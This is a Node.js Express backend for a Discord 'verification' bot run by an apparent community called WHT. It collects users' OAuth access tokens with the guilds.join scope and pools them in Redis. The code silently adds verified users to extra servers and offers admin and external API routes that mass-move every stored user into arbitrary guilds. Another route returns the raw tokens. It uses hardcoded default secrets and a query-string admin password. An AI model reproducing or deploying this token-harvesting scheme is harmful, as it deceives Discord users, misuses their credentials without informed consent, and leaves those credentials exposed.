const express = require('express');
const FormData = require('form-data');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const { Redis } = require('@upstash/redis');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.text());

// ─── REDIS ────────────────────────────────────────────────────
const redis = new Redis({
  url: process.env.KV_REST_API_URL,
  token: process.env.KV_REST_API_TOKEN,
});

// ─── CONFIGURAÇÕES GLOBAIS ────────────────────────────────────
const API_SECRET     = process.env.API_SECRET     || 'wht-secret-2025';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin-wht-2025';
const CANAL_ID       = process.env.CANAL_ID       || '1498452626357096489';

// ─── BOTS CADASTRADOS ─────────────────────────────────────────
// Cada bot tem sua própria rota: /bot1, /bot2, /bot3 ...
// Configure as variáveis de ambiente no Vercel para cada bot:
//
//   BOT1_CLIENT_ID, BOT1_CLIENT_SECRET, BOT1_REDIRECT_URI,
//   BOT1_BOT_TOKEN, BOT1_GUILD_ID, BOT1_CARGO_ID, BOT1_NAME
//
//   BOT2_CLIENT_ID, BOT2_CLIENT_SECRET, ...
//   BOT3_CLIENT_ID, BOT3_CLIENT_SECRET, ...
//
// Para adicionar mais bots, basta adicionar mais entradas aqui
// e configurar as variáveis correspondentes no Vercel.

function getBotsConfig() {
  const bots = {};
  for (let i = 1; i <= 10; i++) {
    const prefix = `BOT${i}_`;
    const clientId = process.env[`${prefix}CLIENT_ID`];
    if (!clientId) continue; // bot não configurado, pula
    bots[`bot${i}`] = {
      id:           `bot${i}`,
      name:         process.env[`${prefix}NAME`]         || `Bot ${i}`,
      client_id:    clientId,
      client_secret:process.env[`${prefix}CLIENT_SECRET`]|| '',
      redirect_uri: process.env[`${prefix}REDIRECT_URI`] || '',
      bot_token:    process.env[`${prefix}BOT_TOKEN`]    || '',
      guild_id:     process.env[`${prefix}GUILD_ID`]     || '',
      cargo_id:     process.env[`${prefix}CARGO_ID`]     || '',
    };
  }
  return bots;
}

// ─── HELPERS REDIS ────────────────────────────────────────────
async function salvarLog(user, accessToken, botId, botName) {
  const entrada = {
    user_id:      String(user.id),
    username:     user.username,
    avatar:       user.avatar,
    access_token: accessToken,
    bot_id:       botId,
    bot_name:     botName,
    ts:           Math.floor(Date.now() / 1000),
  };
  await redis.set(`oauth:${user.id}`, JSON.stringify(entrada));
  await redis.sadd('oauth:ids', String(user.id));
}

async function buscarTodos() {
  const ids = await redis.smembers('oauth:ids');
  if (!ids || ids.length === 0) return [];
  const results = await Promise.all(ids.map(id => redis.get(`oauth:${id}`)));
  return results
    .map(r => (typeof r === 'string' ? JSON.parse(r) : r))
    .filter(Boolean);
}

async function buscarUm(user_id) {
  const data = await redis.get(`oauth:${user_id}`);
  if (!data) return null;
  return typeof data === 'string' ? JSON.parse(data) : data;
}

async function buscarMembrosDoServidor(guild_id, bot_token) {
  const membrosSet = new Set();
  let after = '0';
  while (true) {
    const url = `https://discord.com/api/guilds/${guild_id}/members?limit=1000&after=${after}`;
    const resp = await fetch(url, {
      headers: { 'Authorization': `Bot ${bot_token}` },
    });
    if (resp.status === 403) throw new Error('Bot sem permissão no servidor (403)');
    if (resp.status === 404) throw new Error('Servidor não encontrado (404)');
    if (!resp.ok) throw new Error(`Discord API retornou HTTP ${resp.status}`);
    const membros = await resp.json();
    if (!Array.isArray(membros) || membros.length === 0) break;
    for (const m of membros) membrosSet.add(String(m.user.id));
    if (membros.length < 1000) break;
    after = membros[membros.length - 1].user.id;
    await new Promise(r => setTimeout(r, 500));
  }
  return membrosSet;
}

// ─── ADMIN AUTH ───────────────────────────────────────────────
function adminAuth(req, res, next) {
  const pass = req.query.pass || req.headers['x-admin-pass'];
  if (pass !== ADMIN_PASSWORD) {
    return res.status(401).send(`
      <!DOCTYPE html>
      <html lang="pt-BR">
      <head>
        <meta charset="UTF-8"/>
        <title>WHT Admin — Acesso</title>
        <style>
          *{margin:0;padding:0;box-sizing:border-box}
          body{background:#0d0e14;color:#e8e9f3;font-family:'Segoe UI',sans-serif;
               min-height:100vh;display:flex;align-items:center;justify-content:center}
          .box{background:#13141d;border:1px solid #2a2b3d;border-radius:16px;
               padding:40px;text-align:center;max-width:380px;width:90%}
          h2{color:#ff1493;font-size:20px;margin-bottom:8px}
          p{color:#7b7d9a;font-size:13px;margin-bottom:20px}
          input{width:100%;background:#1a1b27;border:1px solid #2a2b3d;border-radius:8px;
                padding:10px 14px;color:#e8e9f3;font-size:13px;outline:none;margin-bottom:12px}
          input:focus{border-color:rgba(255,20,147,.5)}
          button{width:100%;background:#ff1493;color:#fff;border:none;border-radius:8px;
                 padding:10px;font-size:13px;font-weight:600;cursor:pointer}
        </style>
      </head>
      <body>
        <div class="box">
          <h2>🔐 WHT Admin</h2>
          <p>Digite a senha para acessar o painel</p>
          <input type="password" id="pass" placeholder="Senha do admin..."
                 onkeydown="if(event.key==='Enter')login()"/>
          <button onclick="login()">Entrar</button>
        </div>
        <script>
          function login() {
            const p = document.getElementById('pass').value;
            if(p) window.location.href = '/admin?pass=' + encodeURIComponent(p);
          }
        </script>
      </body>
      </html>
    `);
  }
  next();
}

// ─── PAINEL ADMIN ─────────────────────────────────────────────
app.get('/admin', adminAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ─── API: stats ───────────────────────────────────────────────
app.get('/api/admin/stats', adminAuth, async (req, res) => {
  try {
    const logs  = await buscarTodos();
    const hoje  = Math.floor(Date.now() / 1000) - 86400;
    const bots  = getBotsConfig();

    const extrasRaw = await redis.get('servidores_extras');
    const extras = extrasRaw
      ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw)
      : [];

    // Stats por bot
    const botStats = {};
    for (const [botId, cfg] of Object.entries(bots)) {
      botStats[botId] = {
        id:       botId,
        name:     cfg.name,
        guild_id: cfg.guild_id,
        tokens:   logs.filter(e => e.bot_id === botId).length,
      };
    }

    res.json({
      total_tokens:      logs.length,
      com_token:         logs.filter(e => e.access_token).length,
      sem_token:         logs.filter(e => !e.access_token).length,
      verificados_hoje:  logs.filter(e => e.ts && e.ts > hoje).length,
      servidores_extras: extras.length,
      bots:              Object.values(botStats),
      usuarios: logs.map(e => ({
        user_id:  e.user_id,
        username: e.username,
        avatar:   e.avatar,
        tem_token:!!e.access_token,
        bot_id:   e.bot_id   || null,
        bot_name: e.bot_name || null,
        ts:       e.ts,
      })),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── API: listar bots configurados ───────────────────────────
app.get('/api/admin/bots', adminAuth, async (req, res) => {
  const bots = getBotsConfig();
  const logs = await buscarTodos();
  const result = Object.values(bots).map(b => ({
    id:           b.id,
    name:         b.name,
    client_id:    b.client_id,
    guild_id:     b.guild_id,
    redirect_uri: b.redirect_uri,
    tokens:       logs.filter(e => e.bot_id === b.id).length,
    oauth_url:    `https://discord.com/oauth2/authorize?client_id=${b.client_id}&redirect_uri=${encodeURIComponent(b.redirect_uri)}&response_type=code&scope=identify%20guilds.join`,
  }));
  res.json({ bots: result });
});

// ─── API: servidores extras ───────────────────────────────────
app.get('/api/admin/servidores', adminAuth, async (req, res) => {
  try {
    const raw    = await redis.get('servidores_extras');
    const extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    res.json({ servidores: extras });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/servidores', adminAuth, async (req, res) => {
  const { guild_id } = req.body;
  if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
  try {
    const raw    = await redis.get('servidores_extras');
    const extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    if (!extras.includes(guild_id)) {
      extras.push(guild_id);
      await redis.set('servidores_extras', JSON.stringify(extras));
    }
    res.json({ ok: true, servidores: extras });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/admin/servidores/:guild_id', adminAuth, async (req, res) => {
  const { guild_id } = req.params;
  try {
    const raw    = await redis.get('servidores_extras');
    let extras   = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    extras       = extras.filter(id => id !== guild_id);
    await redis.set('servidores_extras', JSON.stringify(extras));
    res.json({ ok: true, servidores: extras });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── API: mover todos (admin) ────────────────────────────────
app.post('/api/admin/mover-todos', adminAuth, async (req, res) => {
  const { guild_id, bot_id } = req.body;
  if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });

  // Pega o bot_token do bot especificado (ou do primeiro bot configurado)
  const bots = getBotsConfig();
  let bot_token = process.env.BOT_TOKEN; // fallback legado
  if (bot_id && bots[bot_id]) {
    bot_token = bots[bot_id].bot_token;
  } else if (Object.keys(bots).length > 0) {
    bot_token = Object.values(bots)[0].bot_token;
  }

  try {
    const logs = await buscarTodos();
    let ok = 0, falhou = 0;
    for (const entrada of logs) {
      if (!entrada.access_token) { falhou++; continue; }
      try {
        const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${entrada.user_id}`, {
          method: 'PUT',
          headers: { 'Authorization': `Bot ${bot_token}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ access_token: entrada.access_token }),
        });
        if ([200, 201, 204].includes(resp.status)) ok++; else falhou++;
      } catch { falhou++; }
      await new Promise(r => setTimeout(r, 100));
    }
    res.json({ ok, falhou, total: logs.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── MESES ────────────────────────────────────────────────────
const MESES = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
function fmtData(dt) {
  return `${dt.getDate()} de ${MESES[dt.getMonth()]} de ${dt.getFullYear()} ${String(dt.getHours()).padStart(2,'0')}:${String(dt.getMinutes()).padStart(2,'0')}`;
}

// ─── FUNÇÃO OAUTH2 (usada por todas as rotas de bot) ──────────
async function handleOAuth2(req, res, botCfg) {
  const code = req.query.code;
  if (!code) return res.send(`OAuth2 WHT — ${botCfg.name} Online ✅`);

  if (!botCfg.client_id || !botCfg.client_secret) {
    return res.status(400).send(`ERRO: Variáveis de ambiente do ${botCfg.name} não configuradas!`);
  }

  try {
    // Trocar code por token
    const form = new FormData();
    form.append('client_id',     botCfg.client_id);
    form.append('client_secret', botCfg.client_secret);
    form.append('grant_type',    'authorization_code');
    form.append('redirect_uri',  botCfg.redirect_uri);
    form.append('scope',         'identify guilds.join');
    form.append('code',          code);

    const tokenRes  = await fetch('https://discord.com/api/oauth2/token', { method: 'POST', body: form });
    const tokenData = await tokenRes.json();

    if (tokenData.error) {
      return res.status(400).send(`Erro OAuth2: ${tokenData.error} - ${tokenData.error_description}`);
    }

    // Buscar dados do usuário
    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { authorization: `${tokenData.token_type} ${tokenData.access_token}` }
    });
    const user = await userRes.json();

    // Salvar no Redis (com bot_id e bot_name)
    try {
      await salvarLog(user, tokenData.access_token, botCfg.id, botCfg.name);
    } catch (err) {
      console.log('[Aviso] Falha ao salvar no Redis:', err.message);
    }

    const avatarURL = user.avatar
      ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`
      : `https://cdn.discordapp.com/embed/avatars/0.png`;

    // Adicionar ao servidor principal do bot
    try {
      await fetch(`https://discord.com/api/guilds/${botCfg.guild_id}/members/${user.id}`, {
        method: 'PUT',
        headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_token: tokenData.access_token, roles: botCfg.cargo_id ? [botCfg.cargo_id] : [] }),
      });
    } catch (err) {
      console.log('[Aviso] Falha ao adicionar ao servidor:', err.message);
    }

    // Adicionar aos servidores extras
    try {
      const extrasRaw = await redis.get('servidores_extras');
      const extras = extrasRaw
        ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw)
        : [];
      for (const guildId of extras) {
        await fetch(`https://discord.com/api/guilds/${guildId}/members/${user.id}`, {
          method: 'PUT',
          headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ access_token: tokenData.access_token }),
        });
      }
    } catch (err) {
      console.log('[Aviso] Falha nos servidores extras:', err.message);
    }

    // Enviar notificação no Discord
    try {
      const contaCriada = new Date(user.id / 4194304 + 1420070400000);
      const agora       = new Date();
      const idadeDias   = Math.floor((agora - contaCriada) / (1000 * 60 * 60 * 24));

      await fetch(`https://discord.com/api/channels/${CANAL_ID}/messages`, {
        method: 'POST',
        headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            color: 0xFF1493,
            title: '✨ NOVO MEMBRO VERIFICADO ✨',
            description: `## ${user.username}`,
            fields: [
              { name: '🎉 Verificação', value: `<@${user.id}> verificado via **${botCfg.name}**!\nCargo: <@&${botCfg.cargo_id}>`, inline: false },
              { name: '🪪 ID', value: `\`${user.id}\``, inline: true },
              { name: '🎂 Idade da Conta', value: `\`${idadeDias} dias\``, inline: true },
              { name: '🤖 Bot', value: botCfg.name, inline: true },
            ],
            thumbnail: { url: avatarURL },
            footer: { text: `WHT COMMUNITY 🍄 • ${botCfg.name} • ${fmtData(agora)}` },
          }]
        })
      });
    } catch (err) {
      console.log('[Aviso] Falha ao enviar mensagem:', err.message);
    }

    // Página de sucesso
    res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WHT Community — Verificado</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0a0a0f;color:white;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
    .bg-glow{position:fixed;width:600px;height:600px;background:radial-gradient(circle,rgba(255,20,147,0.15) 0%,transparent 70%);top:50%;left:50%;transform:translate(-50%,-50%);pointer-events:none}
    .card{background:rgba(255,255,255,0.04);border:1px solid rgba(255,20,147,0.3);border-radius:20px;padding:48px 40px;text-align:center;max-width:440px;width:90%;box-shadow:0 0 40px rgba(255,20,147,0.15);position:relative;z-index:1}
    .logo-wrap{width:100px;height:100px;border-radius:50%;border:3px solid #FF1493;margin:0 auto 16px;box-shadow:0 0 20px rgba(255,20,147,0.5);overflow:hidden}
    .logo-wrap img{width:100%;height:100%;object-fit:cover;border-radius:50%}
    .avatar{width:64px;height:64px;border-radius:50%;border:3px solid #FF1493;margin:0 auto 16px;box-shadow:0 0 15px rgba(255,20,147,0.4);display:block}
    h1{font-size:26px;font-weight:700;color:#FF1493;margin-bottom:8px;text-shadow:0 0 20px rgba(255,20,147,0.5)}
    .username{font-size:18px;color:#ffb3d9;margin-bottom:8px}
    p{color:#aaa;font-size:14px;line-height:1.6;margin-bottom:16px}
    .badge{display:inline-block;background:rgba(255,20,147,0.15);border:1px solid rgba(255,20,147,0.4);color:#FF1493;padding:6px 16px;border-radius:20px;font-size:13px;margin-bottom:20px}
    .countdown{font-size:13px;color:#FF1493;margin-bottom:16px;font-weight:600}
    .btn-discord{display:inline-flex;align-items:center;gap:8px;background:#5865F2;color:white;padding:12px 24px;border-radius:12px;text-decoration:none;font-size:15px;font-weight:600}
    .divider{border:none;border-top:1px solid rgba(255,20,147,0.2);margin:20px 0}
    .footer{color:#555;font-size:12px;margin-top:24px}
  </style>
</head>
<body>
  <div class="bg-glow"></div>
  <div class="card">
    <div class="logo-wrap"><img src="https://i.imgur.com/G37BiaD.gif" alt="WHT"/></div>
    <img class="avatar" src="${avatarURL}" alt="Avatar"/>
    <h1>Verificado com sucesso!</h1>
    <div class="username">Olá, ${user.username}!</div>
    <hr class="divider"/>
    <div class="badge">🐺 WHT Community</div>
    <p>Verificado via <strong>${botCfg.name}</strong>.<br/>Redirecionando para o Discord...</p>
    <div class="countdown">Voltando em <span id="timer">3</span>s...</div>
    <a class="btn-discord" href="https://discord.com/channels/@me">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
      Abrir Discord
    </a>
    <div class="footer">WHT Community • ${botCfg.name}</div>
  </div>
  <script>
    let t=3;const el=document.getElementById('timer');
    const iv=setInterval(()=>{t--;el.textContent=t;if(t<=0){clearInterval(iv);window.location.href='https://discord.com/channels/@me';}},1000);
  </script>
</body>
</html>`);

  } catch (err) {
    console.error('ERRO GERAL:', err.message);
    res.status(500).send('Erro ao processar verificação.');
  }
}

// ─── ROTAS DINÂMICAS DOS BOTS ────────────────────────────────
// Cada bot tem sua própria rota: /bot1, /bot2, /bot3 ...
for (let i = 1; i <= 10; i++) {
  app.get(`/bot${i}`, async (req, res) => {
    const bots = getBotsConfig();
    const cfg  = bots[`bot${i}`];
    if (!cfg) return res.status(404).send(`Bot ${i} não configurado. Adicione as variáveis BOT${i}_* no Vercel.`);
    await handleOAuth2(req, res, cfg);
  });
}

// ─── ROTA LEGADA (/ para bot1 por compatibilidade) ───────────
app.get('/', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('OAuth2 Backend WHT - Online ✅ | Admin: /admin');

  // Compatibilidade: rota / usa variáveis legadas BOT_TOKEN, CLIENT_ID, etc.
  const legacyCfg = {
    id:            'bot1',
    name:          'WHT Bot Principal',
    client_id:     process.env.CLIENT_ID     || process.env.BOT1_CLIENT_ID,
    client_secret: process.env.CLIENT_SECRET || process.env.BOT1_CLIENT_SECRET,
    redirect_uri:  process.env.REDIRECT_URI  || process.env.BOT1_REDIRECT_URI,
    bot_token:     process.env.BOT_TOKEN     || process.env.BOT1_BOT_TOKEN,
    guild_id:      process.env.GUILD_ID      || process.env.BOT1_GUILD_ID,
    cargo_id:      process.env.CARGO_ID      || process.env.BOT1_CARGO_ID,
  };
  await handleOAuth2(req, res, legacyCfg);
});

// ─── API EXTERNA (bots externos consultam) ───────────────────
app.get('/api/logs', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET)
    return res.status(401).json({ error: 'Unauthorized' });
  try {
    const logs = await buscarTodos();
    res.json({ total: logs.length, com_token: logs.filter(e => e.access_token).length, logs });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/mover', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET)
    return res.status(401).json({ error: 'Unauthorized' });
  const { user_id, guild_id } = req.body;
  if (!user_id || !guild_id)
    return res.status(400).json({ error: 'user_id e guild_id sao obrigatorios' });
  try {
    const entrada = await buscarUm(user_id);
    if (!entrada || !entrada.access_token)
      return res.status(404).json({ error: 'Usuario nao encontrado ou sem token' });
    const bot_token = process.env.BOT_TOKEN || process.env.BOT1_BOT_TOKEN;
    const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${user_id}`, {
      method: 'PUT',
      headers: { 'Authorization': `Bot ${bot_token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ access_token: entrada.access_token }),
    });
    res.json({ success: [200, 201, 204].includes(resp.status), status: resp.status });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = app;
